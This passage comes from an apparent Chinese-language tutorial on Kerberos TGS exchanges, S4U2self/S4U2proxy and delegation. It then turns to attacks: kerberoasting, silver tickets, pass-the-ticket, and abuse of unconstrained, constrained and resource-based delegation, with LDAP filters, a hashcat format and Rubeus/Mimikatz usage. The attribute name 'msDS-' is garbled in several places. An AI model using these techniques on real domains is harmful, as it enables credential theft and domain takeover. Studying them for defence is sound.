<p>值是一个唯一的标识符，该标识符指示用户的身份。该唯一标识符由用户名和域名组成。</p>
<p>S4U2proxy 必须扩展PA_FOR_USER结构，指定服务代表某个用户(图片里面是administrator)去请求针对服务自身的kerberos服务票据。</p>
<ul>
<li>PA_PAC_OPTIONS</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01754019b5586d0dca.png"></p>
<p>类型是 PA_PAC_OPTIONS</p>
<p>值是以下flag的组合</p>
<p>– Claims(0)<br>– Branch Aware(1)<br>– Forward to Full DC(2)<br>– Resource-based Constrained Delegation (3)</p>
<p>微软的<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/aeecfd82-a5e4-474c-92ab-8df9022cf955">MS-SFU 2.2.5</a>， S4U2proxy 必须扩展PA-PAC-OPTIONS结构。</p>
<p>如果是基于资源的约束委派，就需要指定Resource-based Constrained Delegation位。</p>
<h4 id="REQ-BODY-1"><a href="#REQ-BODY-1" class="headerlink" title="REQ_BODY"></a>REQ_BODY</h4><ul>
<li>sname</li>
</ul>
<p>这个是要请求的服务，TGS_REP获得的ticket是用该服务用户的hash进行加密的。有个比较有意思的特性是，如果指定的服务是krbtgt，那么拿到的TGS票据是可以当做TGT票据用的。</p>
<ul>
<li>AddtionTicket</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0112df2cb72419b653.png"><br>附加票据，在S4U2proxy请求里面，既需要正常的TGT，也需要S4U2self阶段获取到的TGS，那么这个TGS就添加到AddtionTicket里面。</p>
<h3 id="TGS-REP"><a href="#TGS-REP" class="headerlink" title="TGS_REP"></a>TGS_REP</h3><p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt010446cb7008acd427.png"></p>
<h4 id="msg-type-3"><a href="#msg-type-3" class="headerlink" title="msg-type"></a>msg-type</h4><p>AS_REQ的响应body对应的就是KRB_TGS_REQ(0x0d)</p>
<h4 id="ticket-1"><a href="#ticket-1" class="headerlink" title="ticket"></a>ticket</h4><p>这个ticket用于AP_REQ的认证。其中里面的enc_part是加密的，用户不可读取里面的内容。在AS_REQ请求里面是，是使用krbtgt的hash进行加密的，而在TGS_REQ里面是使用要请求的服务的hash加密的。因此如果我们拥有服务的hash就可以自己制作一个ticket，既白银票据。详情见<a href='#p3'>相关的安全问题&gt;白银票据</a>。正因为是使用要请求的服务的hash加密的，所以我们可以通过爆破enc_part获得该服务的hash,详情见<a href='#p4'>相关的安全问题&gt;kerberoasting</a>。</p>
<h4 id="enc-part-1"><a href="#enc-part-1" class="headerlink" title="enc_part"></a>enc_part</h4><p>注意，这个enc_part不是ticket里面的enc_part，</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01c767928bb11720ed.png"></p>
<p>这部分是可以解密的，key是上一轮AS_REP里面返回的session_key,也就是导入凭据里面的 session_key，解密后得到encryptionkey，encryptionkey这个结构里面最重要的字段也是session_key(但是这个session_key 不同于上一轮里面的session_key)，用来作为作为下阶段的认证密钥。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt018bbc64e0a98a1624.png"></p>
<h3 id="S4U2SELF"><a href="#S4U2SELF" class="headerlink" title="S4U2SELF"></a>S4U2SELF</h3><p>S4U2self 使得服务可以代表用户获得针对服务自身的kerberos服务票据。这使得服务可以获得用户的授权( 可转发 的用户TGS票据)，然后将其用于后期的认证(主要是后期的s4u2proxy)，这是为了在用户以不使用 Kerberos 的方式对服务进行身份验证的情况下使用。<strong>这里面很重要的一点是服务代表用户获得针对服务自身的kerberos票据这个过程，服务是不需要用户的凭据的。</strong></p>
<p>s4u2self的过程如下图所示</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage004.png"></p>
<p>前提条件是服务已经有通过KDC验证的TGT，如图，需要有TGT。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt017817a54b237402ca.png"></p>
<p>在步骤1中, 服务(<code>JACKSON-PC$</code>)使用S4U2self扩展名代表用户(<code>administrator</code>)获得针对服务本身(<code>JACKSON-PC$</code>)的服务票证。该服务将填写<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/MS-SFU/aceb70de-40f0-4409-87fa-df00ca145f5a">PA_FOR_USER</a> 数据结构,类型为<code>S4U2SELF</code>，并将KRB_TGS_REQ消息发送到TGS。 如下图，由于服务<code>JACKSON-PC$</code>代表用户向服务本身(也是<code>JACKSON-PC$</code>)发起请求，因此这里面cname是<code>JACKSON-PC$</code>,sname也是<code>JACKSON-PC$</code></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0165110651aba6ba8e.png"></p>
<p>假定TGS支持PA_FOR_USER扩展，则TGS在步骤2中通过KRB_TGS_REP消息返回用户的服务票证。如果服务请求了可转发选项，并且TGS的本地策略允许，则TGS检验通过后必须将票证标志 字段设置为可转发，既只要满足即可。</p>
<ol>
<li>TGT是可以转发的</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01f0d5a317d69bf6b1.png"></p>
<ol start="2">
<li>服务配置了约束委派</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01d417ae1cd342e030.png"></p>
<ol start="3">
<li>服务请求了可转发选项</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01dccc1d4515448533.png"></p>
<p>则TGS必须将票证标志 字段设置为可转发</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01290857d9ece54e8b.png"></p>
<p>需要注意的是，如果用户的UserAccountControl字段中设置了USER_NOT_DELEGATED位,那么返回的TGS是永远也没法转发的。如图，当Administrator配置了敏感账户，不能被委派，返回的TGS的flag字段没有forwardable。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt012f37c48fb6f44ee3.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0149b8fc062b39e8eb.png"></p>
<h3 id="S4U2PROXY"><a href="#S4U2PROXY" class="headerlink" title="S4U2PROXY"></a>S4U2PROXY</h3><p>s4u2proxy 使得服务1可以使用来自用户的授权( 在S4U2SELF阶段获得)，然后用该TGS(放在AddtionTicket里面)向KDC请求访问服务2的TGS，并且代表用户访问服务2，而且只能访问服务2。</p>
<p>s4u2proxy的过程如下图所示:</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage006.png"></p>
<p>在步骤1中，服务1试图代表用户获取服务2的服务票证。服务1发送KRB_TGS_REQ消息，并将用户的服务1服务票证作为 请求中的AddtionTicket。只要满足以下条件</p>
<ol>
<li>拥有来自用户的授权( 在S4U2SELF阶段获得的TGS票据)，放在AddtionTicket里面。</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b34f1588fb52e51a.png"></p>
<ol start="2">
<li>在请求的kdc-options中设置了CNAME-IN-ADDL-TKT标志。</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ab603f6af72f7e14.png"></p>
<ol start="3">
<li>服务请求了可转发选项</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01c5de2a391c02806a.png"></p>
<ol start="4">
<li>服务1 有到服务2的约束委派，将服务2的SPN放在sname里面。</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01480c801b6bdf61a6.png"></p>
<p>如果满足这些条件，则在步骤2中TGS会制作KRB_TGS_REP消息以返回服务票证。可转发标志将在服务票证中设置。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0162de853515ec7acb.png"></p>
<p>有个点需要注意的是，前面在S4U2SELF里面提到，在满足一定的条件之后，S4U2SELF返回的票据是可以转发的，这个票据作为S4U2PROXY的AddtionTicket，有些文章里面会说，S4U2PROXY要求AddtionTicket里面的票据一定要是可转发的，否则S4U2PROXY生成的票据是不可以转发的。这个说法在引入可资源约束委派的情况下，是不成立的，下面分情况具体说下。</p>
<ul>
<li>AddtionTicket里面的票据是可转发的</li>
</ul>
<p>如果AddtionTicket里面的票据是可转发的，只要KDC Options里面置forwarable位，那么返回的票据必须置为可转发的</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt010bb8353a67af855f.png"></p>
<ul>
<li>AddtionTicket里面的票据是不可转发的</li>
</ul>
<p>如果AddtionTicket中的服务票据未设置为可转发的，则KDC必须返回状态为STATUS_NO_MATCH的KRB-ERR-BADOPTION选项。除了一种情况之外，就是配置了服务1到服务2 的基于资源的约束委派，且PA-PAC-OPTION设置了Resource-Based Constrained Delegation标志位(这一例外的前提是S4U2SELF阶段模拟的用户没被设置为对委派敏感，对委派敏感的判断在S4U2SELF阶段，而不是S4U2PROXY阶段)。</p>
<p>AddtionTicket里面的票据是不可转发的</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt016f00ab59ffbfc017.png"></p>
<p>配置了服务1到服务2 的基于资源的约束委派</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01992b2d344c1fce87.png"></p>
<p>PA-PAC-OPTION设置了Resource-Based Constrained Delegation标志位</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt016f52b4e6be469160.png"></p>
<p>返回的TGS票据是可转发的</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01dec627a9dcae2762.png"></p>
<h3 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h3><p>在Windows 2000 Server首次发布Active Directory时，Microsoft必须提供一种简单的机制来支持用户通过Kerberos向Web Server进行身份验证并需要代表该用户更新后端数据库服务器上的记录的方案。这通常称为“ Kerberos双跳问题”，并且要求进行委派，以便Web Server在修改数据库记录时模拟用户。需要注意的一点是接受委派的用户只能是<strong>服务账户</strong>或者<strong>计算机用户</strong>。</p>
<h4 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h4><p>Microsoft在Windows 2000中实现了Kerberos“不受约束的委托”，从而启用了这种级别的委托。</p>
<p>非约束委派的配置如下</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0196779fc9a6d7b383.png"></p>
<p>服务(如<code>JACKSON-PC$</code>) 被配置了非约束的委派，那么<code>JACKSON-PC$</code>可以接受任何用户的委派的去请求其他所有服务。在协议层面的实现就是，某个用户委托<code>JACKSON-PC$</code>去访问某个服务，那么这个用户会将 TGT（在TGS里面）发送到<code>JACKSON-PC$</code>并缓存到LSASS中，以方便以后使用。 然后<code>JACKSON-PC$</code>模拟用户去请求某个服务。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt012bc3f8c98ee75003.png"></p>
<p>配置了非约束委派的用户的 <code>userAccountControl</code> 属性有个FLAG位 <code>TrustedForDelegation</code></p>
<p>关于 <code>userAccountControl</code> 每一位对应的意义可以看<a href="http://woshub.com/decoding-ad-useraccountcontrol-value/">Converting AD UserAccountControl Attribute Values</a>,(我会在LDAP篇中也会详细介绍)，其中 TRUSTED_FOR_DELEGATION 对应是 0x80000 ，也就是 524288 。</p>
<h4 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h4><p>微软很早就意识到非约束委派并不是特别安全，在 Windows 2003上发布了”约束”委派。 其中包括一组 Kerberos 协议扩展，就是本文之前提到的两个扩展 S4U2Self 和 S4U2Proxy。配置它后，约束委派将限制指定服务器可以代表用户执行的服务。这需要域管理员特权(其实严谨一点是SeEnableDelegation特权，该特权很敏感，通常仅授予域管理员)才能为服务配置域帐户，并且将帐户限制为单个域。</p>
<p>约束委派的配置如下</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01557263f6efa97c78.png"></p>
<p>计算机用户(既JACKSON-PC$) 被配置了约束的委派，那么JACKSON-PC$可以接受任何用户的委派的去请求特定的服务。具体过程是收到用户的请求之后，首先代表用户获得针对服务自身的可转发的kerberos服务票据(S4U2SELF)，拿着这个票据向KDC请求访问特定服务的可转发的TGS(S4U2PROXY)，并且代表用户访问特定服务，而且只能访问该特定服务。</p>
<p>相较于非约束委派，约束委派最大的区别也就是配置的时候选择某个特定的服务，而不是所有服务。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01a8167d0e38d7d925.png"></p>
<p>配置了约束委派的用户的userAccountControl 属性有个FLAG位 TrustedToAuthForDelegation 。</p>
<p>关于userAccountControl 每一位对应的意义可以看<a href="http://woshub.com/decoding-ad-useraccountcontrol-value/">Converting AD UserAccountControl Attribute Values</a>,其中 TRUSTED_TO_AUTH_FOR_DELEGATION 对应是 0x1000000 ，也就是 16777216 。</p>
<p>约束的资源委派，除了配置TRUSTED_TO_AUTH_FOR_DELEGATION 之外，还有个地方是存储对哪个spn 进行委派的，位于msDS-AllowedToDelegateTo</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt010d0cbd566f509b39.png"></p>
<p>最后来理一理约束委派的整个流程。</p>
<p>主要是有四个角色的存在：</p>
<ol>
<li>访问服务的用户(这里面是administrator)</li>
<li>接受委派的服务1(这里面是JACKSON-PC$）</li>
<li>要访问的服务2(这里面是CIFS&#x2F;WIN-JQO4OSMOGK2.JMU.com)</li>
<li>KDC（Key Distribution Center）密钥分发中心 kerberos</li>
</ol>
<p>首先先做一些配置。配置服务1 到服务2的约束委派</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt010bd2d801df311e1d.png"></p>
<p>整个完整的流程是</p>
<ol>
<li>服务1 使用自己的hash向KDC申请一个TGT票据，注意在KDC Option里面选择FORWARDABLE标志位，这样的话请求的TGT票据就是可转发的TGT票据。</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0101abe228f24cb52e.png"></p>
<ol start="2">
<li>服务1 代表用户申请一个获得针对服务1自身的kerberos服务票据(这一步就是S4U2SELF，对于这一步有疑问的可以返回前面的S4U2SLEF看看)，这一步生成的TGS票据是可转发的TGS票据。</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01643b3666307641c7.png"></p>
<h4 id="基于资源的约束委派"><a href="#基于资源的约束委派" class="headerlink" title="基于资源的约束委派"></a>基于资源的约束委派</h4><p>为了配置受约束的委派，必须拥有<code>SeEnableDelegation</code>特权，该特权很敏感，通常仅授予域管理员。为了使用户&#x2F;资源更加独立，Windows Server 2012中引入了基于资源的约束委派。基于资源的约束委派允许资源配置受信任的帐户委派给他们。基于资源的约束委派将委派的控制权交给拥有被访问资源的管理员。</p>
<p>基于资源的约束委派只能在运行Windows Server 2012 R2和Windows Server 2012的域控制器上配置，但可以在混合模式林中应用。</p>
<p>这种约束委派的风格与传统约束委派非常相似，但配置相反。从帐户A到帐户B的传统约束委派在msDS-AllowedToDelegateTo属性中的帐户A上配置，并定义从A到B的“传出”信任，而在马上到！S-AllowedToActOnBehalfOfOtherIdentity属性中的帐户B上配置基于资源的约束委派，并定义从A到B的“传入”信任，见下图。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01fe78dcd0b3af3aa4.jpg"></p>
<p>最后来理一理基于资源的约束委派的整个流程。</p>
<p>主要是有四个角色的存在：</p>
<ol>
<li>访问服务的用户(这里面是administrator)</li>
<li>接受委派的服务1(这里面是JACKSON-PC$）</li>
<li>要访问的服务2(这里面是CIFS&#x2F;WIN-JQO4OSMOGK2.JMU.com)</li>
<li>KDC（Key Distribution Center）密钥分发中心 kerberos</li>
</ol>
<p>首先先做一些配置。在服务2上 配置服务1 到服务2的基于资源的约束委派(不同于传统的约束委派需要域管的权限才能配置，只有拥有服务2 的权限就可以配置基于资源的约束委派)</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt018171f91df7051b10.png"></p>
<p>整个完整的流程是</p>
<ol>
<li>服务1 使用自己的hash向KDC申请一个TGT票据。</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01f95752e14f93440d.png"></p>
<ol start="2">
<li>服务1 代表用户申请一个获得针对服务1自身的kerberos服务票据(这一步就是S4U2SELF，这一步就区别传统的约束委派，在S4U2SELF里面提到，返回的TGS可转发的一个条件是服务1配置了传统的约束委派，kdc会检查服务1 的TrustedToAuthForDelegation位和msDS-AllowedToDelegateTo  这个字段，由于基于资源的约束委派，是在服务2配置，服务2的马上到！S-AllowedToActOnBehalfOfOtherIdentity属性配置了服务1 的sid，服务1并没有配置TrustedToAuthForDelegation位和msDS-AllowedToDelegateTo 字段。因此这一步返回的TGS票据是不可转发的。</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01e456651d781dee2b.png"></p>
<ol start="3">
<li>服务1可以使用来自用户的授权( 在S4U2SELF阶段获得的不可转发的TGS)，然后用该TGS(放在AddtionTicket里面)向KDC请求访问服务2的可转发的TGS</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01aaf270c4aab42b0f.png"></p>
<h3 id="相关的安全问题-1"><a href="#相关的安全问题-1" class="headerlink" title="相关的安全问题"></a>相关的安全问题</h3><h4 id="pass-the-ticket"><a href="#pass-the-ticket" class="headerlink" title="pass the ticket"></a>pass the ticket</h4><p>Kerbreos 除了第一步AS_ERQ是使用时间戳加密用户hash验证之外，其他的步骤的验证都是通过票据，这个票据 可以是TGT票据或者TGS票据。因为票据里面的内容主要是session_key和ticket(使用服务hash加密的，服务包括krbtgt)，拿到票据之后。我们就可以用这个票据来作为下阶段的验证了。</p>
<h4 id="kerberosting"><a href="#kerberosting" class="headerlink" title="kerberosting"></a>kerberosting</h4><p>正因为TGS_REP里面ticket里的enc_part(是ticket里面的enc_part,不是最外层的enc_part,最外层的enc_part是使用AS_REP里面的session_key加密的，这个session_key我们已经有了，没有意义)</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01642709fde6925df7.png"></p>
<p>是使用要请求的服务的hash加密的，所以我们可以通过爆破获得服务的hash。这个问题存在的另外一个因素是因为用户向KDC发起TGS_REQ请求，不管用户对服务有没有访问权限，只要TGT正确，那么肯定会返回TGS。其实AS_REQ里面的服务就是krbtgt，也就是说这个同样用于爆破AS_REP里面的ticket部分的encpart得到krbtgt的hash，但是之所以在网上没见到这种攻击方式是因为krbtgt的密码是随机生成的，也跑不出来.</p>
<p>sname 部分填写要爆破部分的spn</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt013ef51d55a55d13fb.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt010b5fc2230d8c588d.png"></p>
<p>然后按照 <code>format(&quot;$krb5tgs$&#123;0&#125;$*&#123;1&#125;$&#123;2&#125;$&#123;3&#125;*$&#123;4&#125;$&#123;5&#125;&quot;, encType, userName, domain, spn, cipherText.Substring(0, 32), cipherText.Substring(32))</code> 就可以拼接处hash cat(13100)能跑的hash。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ec910f20c5a5d6b9.png"></p>
<p>这里面只做漏洞原理演示。方便的工具化的利用参见部分相关的工具</p>
<h4 id='p3'>白银票据</h4>

<p>在TGS_REP里面的ticket的encpart是使用服务的hash进行加密的，如果我们拥有服务的hash，就可以给我们自己签发任意用户的TGS票据，这个票据也被称为白银票据。相较于黄金票据，白银票据使用要访问服务的hash，而不是krbtgt的hash，由于生成的是tgs票据，不需要跟域控打交道，但是白银票票据只能访问特定服务。但是要注意的一点是，伪造的白银票据没有带有有效KDC签名的PAC。如果将目标主机配置为验证KDC PAC签名(关于PAC的详细信息，将在下一章节里面详细介绍)，则银票将不起作用。</p>
<h4 id="非约束委派攻击"><a href="#非约束委派攻击" class="headerlink" title="非约束委派攻击"></a>非约束委派攻击</h4><p>非约束委派的安全问题就是如果我们找到配置了非约束的委派的账户，比如这里面的<code>JACKSON-PC$</code>，并且通过一定手段拿下该账户的权限，然后诱导域管访问该<code>JACKSON-PC$</code>，这个时候域管会将自己TGT发送到<code>JACKSON-PC$</code>并缓存到LSASS中，那我们就可以从LSASS中导出域管的TGT票据，然后通过PTT，从而拥有域管的权限。</p>
<ul>
<li>找到配置了非约束的委派的账户</li>
</ul>
<p>因为配置非约束的委派的账户的UserAccount 配置了TRUSTED_FOR_DELEGATION flag位，TRUSTED_FOR_DELEGATION 对应是 0x80000 ，也就是 524288 。</p>
<p>所以对应的LDAP过滤规则是</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(&amp;(objectCategory=computer)(objectClass=computer)(userAccountControl:<span class="number">1.2</span><span class="number">.840</span><span class="number">.113556</span><span class="number">.1</span><span class="number">.4</span><span class="number">.803</span>:=<span class="number">524288</span>))</span><br></pre></td></tr></table></figure>

<p>可以通过这个规则进行查找</p>
<p>以adfind为例(其他支持ldap的工具都可以实现)</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt019459468317d2c944.png"></p>
<ol>
<li>通过一定手段拿下这台配置了非约束委派的账户的权限(比如这里面的JACKSON-PC$)</li>
<li>通过一定手段(比如通过打印机的那个漏洞)诱导域管访问我们拿下的配置了非约束委派的账户</li>
<li>最后导出票据然后进行pass the ticket</li>
</ol>
<h4 id="约束委派攻击"><a href="#约束委派攻击" class="headerlink" title="约束委派攻击"></a>约束委派攻击</h4><p>约束委派的安全问题就是如果我们找到配置了约束委派的服务账号，比如这里面的JACKSON-PC$，并且通过一定手段拿下该账号所在的机子。我们就可以利用这个服务账号代表任意用户(这里面很重要的一点是服务代表用户获得针对服务自身的kerberos票据这个过程，服务是不需要用户的凭据的)进行s4u2self获得一个可转发的票据，然后把获取到的票据用于s4u2proxy(作为AddtionTicket)，从未获取一个可转发的TGS，服务就可以代替任意用户访问另外一个服务(既被配置的约束委派的服务，这里面就是cifs&#x2F;WIN-JQO4OSMOGK2.JMU.com）。</p>
<p>相较于非约束的委派，约束的委派并不需要用户过来访问就可以代表该用户，但是只能访问特定的服务(对于 HOST SPN，则可以实现完全的远程接管。 对于 MSSQLSvc SPN，则可以拿到 DBA 权限。 对于 CIFS SPN 则可以实现完全的远程文件访问。对于 HTTP SPN 则可能实现接管远程网络服务，而对于 LDAP 则可以执行 DCSync;) ，对于 HTTP 或 SQL 服务帐户，即使它们没有提升目标服务器上的管理员权限，也可能使用 Rotten Potato 进一步滥用，提权至 SYSTEM 的权限)，不像非约束的委派哪个可以访问任意服务。</p>
<ol>
<li>找到配置了约束的委派的服务账户1</li>
</ol>
<p>因为配置约束的委派的机子的 UserAccount 配置了 TRUSTED_TO_AUTH_FOR_DELEGATION flag 位，  TRUSTED_TO_AUTH_FOR_DELEGATION 对应是 0x1000000 ，也就是 1677721</p>
<p>所以对应的LDAP过滤规则是</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(&amp;(objectCategory=computer)(objectClass=computer)(userAccountControl:<span class="number">1.2</span><span class="number">.840</span><span class="number">.113556</span><span class="number">.1</span><span class="number">.4</span><span class="number">.803</span>:=<span class="number">16777216</span>))</span><br></pre></td></tr></table></figure>

<p>以adfind为例(其他支持ldap的工具都可以实现)</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01a31323725175e35e.png"></p>
<ol start="2">
<li>找到该服务账号委派1委派的服务账户2</li>
</ol>
<p>约束的资源委派，除了配置TRUSTED_TO_AUTH_FOR_DELEGATION 之外，还有个地方是存储对哪个spn 进行委派的，位于msDS-AllowedToDelegateTo ，查询该服务账号的msDS-AllowedToDelegateTo位</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01f24d94796040f2f0.png"></p>
<ol>
<li>通过一定手段拿下这个服务账户1</li>
<li>发起一个从服务1到服务2的正常的约束委派的流程，从而访问服务2</li>
</ol>
<p>这个流程见上面的委派&gt;约束委派，使用rubeus也可以很方便得进行一键访问，详细利用见部分相关工具&gt;rubrus&gt;s4u)，从而访问到这个服务账户委派的服务使用约束委派也可以很方便得留下后门，如果我们配置了服务1到服务2的约束委派，那么只要我们控制服务1，也就可以访问服务2。服务2可以是任何服务。比如服务2是krbtgt，那么只要我们控制着服务1，那么模拟任意用户最后生成的TGS就是任意用户的TGT，这算是一种变形的黄金票据。如果服务2是CIFS&#x2F;域控计算账户，那么只要我们控制着服务1，是不是就可以随时从域控里面提取任意用户的hash。思路挺多的，懂得约束委派的原理就可以自己扩展。</p>
<h4 id="基于资源的约束委派攻击"><a href="#基于资源的约束委派攻击" class="headerlink" title="基于资源的约束委派攻击"></a>基于资源的约束委派攻击</h4><p>基于资源的约束委派具有传统的约束委派的所有安全问题，但是相较于传统的约束委派。基于资源的约束委派的利用又相对较为简单。</p>
<p>主要体现为，普通的约束委派的配置需要SeEnableDelegation权限，而这个权限通常仅授予Domain Admins。因此我们对普通的约束委派的利用，往往在于寻找域内已有的约束委派，再利用。但是对于基于资源的约束委派，假如我们已经拥有服务账号1，那么只要我们具备用户2的LDAP权限，这样就可以配置服务1对服务2的约束委派(在服务账户2的用户属性上配置马上到！S-AllowedToActOnBehalfOfOtherIdentity为1的sid)，服务1就可以控制服务2。</p>
<p>所以基于资源的约束委派的利用，就有一种新的攻击思路</p>
<ol>
<li>我们拥有一个任意的服务账户1 或者计算机账户1</li>
</ol>
<p>这一步不难，我们我们拥有域内机器，提升到system权限，该计算机用户，用户名为计算机账号$就是服务账号。如果我们只有普通的域内用户，可以滥用MachineAccountQuota,详细细节见 部分相关的工具&gt;Powermad</p>
<ol start="2">
<li>我们获得服务账户2 的LDAP权限</li>
</ol>
<p>这一步可以结合ntlm relay，从其他协议relay 而来，关于这一步，更多的是ntlm relay的过程，限于篇幅原因，这里面会在ntlm篇的relay详细介绍。典型案例就是CVE2019-1040。</p>
<ol start="3">
<li>配置服务1对服务2的约束委派</li>
</ol>
<p>在服务账户2的用户属性上配置马上到！S-AllowedToActOnBehalfOfOtherIdentity为服务账户1的sid</p>
<ol start="4">
<li>发起一个从服务1到服务2的正常的约束委派的流程，从而访问服务2。</li>
</ol>
<p>这个流程见上面的委派&gt;约束委派，使用rubeus也可以很方便得进行一键访问，详细利用见部分相关工具&gt;rubrus&gt;s4u)</p>
<h3 id="部分相关工具"><a href="#部分相关工具" class="headerlink" title="部分相关工具"></a>部分相关工具</h3><h4 id="rubeus"><a href="#rubeus" class="headerlink" title="rubeus"></a>rubeus</h4><ul>
<li>asktgs</li>
</ul>
<p>这个功能用于发送tgs请求包，并将凭据以base64打印出来。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01085dab7139828459.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01babc1ad56af253a6.png"></p>
<ul>
<li><p id='p4'>kerberoasting</p></li>
</ul>
<p>Rubes里面的kerberoast支持对所有用户或者特定用户执行kerberoasting操作，其原理在于先用LDAP查询于内的spn，再通过发送TGS包，提取拼接得到hashcat或者john能爆破的格式。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01dc70242e62e6e22c.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0111b2a91baa7c7ea3.png"></p>
<ul>
<li>monitor&#x2F;harvest</li>
</ul>
<p>这个模块用于非约束委派的利用</p>
<p>rubeus的monitor或者harvest模块会从日志里面过滤出 4624 ，然后提取TGT票据打印出来。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt014ba58f3df78f7106.png"></p>
<p>提取完之后是base64，可以利用powershell 导出为kirbi格式的文件(注意回车换行，然后就可以使用mimikatz的ptt，rubeus的ptt，或者转化为ccache使用impacket的ptt都可以，然后rubeusde ptt是支持base64的)</p>
<ul>
<li>s4u</li>
</ul>
<p>rubeus的s4u支持一条命令发起一个约束委派的流程</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt012577dccea165c748.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01fe9636d3d9a01420.png"></p>
<h4 id="mimikatz-1"><a href="#mimikatz-1" class="headerlink" title="mimikatz"></a>mimikatz</h4><ul>
<li>kerberos::golden</li>
</ul>
<p>mimikatz的kerberos::golden模块可以用于制作白银票据,票据格式是.kirbi</p>
<p>利用已知的服务账号的密码(如通过kerberosting)计算出hash</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import hashlib,binascii; print binascii.hexlify(hashlib.new(&quot;md4&quot;, &quot;p@Assword!123&quot;.encode(&quot;utf-16le&quot;)).digest())&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01f3c6f0fe78e2630d.png"></p>
<p>获取sid</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt017c447de7a6e799a6.png"></p>
<p>制作白银票据</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01dd56fa41a8bdee0a.png"></p>
<ul>
<li>kerberos::ptt</li>
</ul>
<p>mimikatz的kerberos::ptt 模块可以用于 pass the ticket</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01299c5b710f1c8067.png"></p>
<ul>
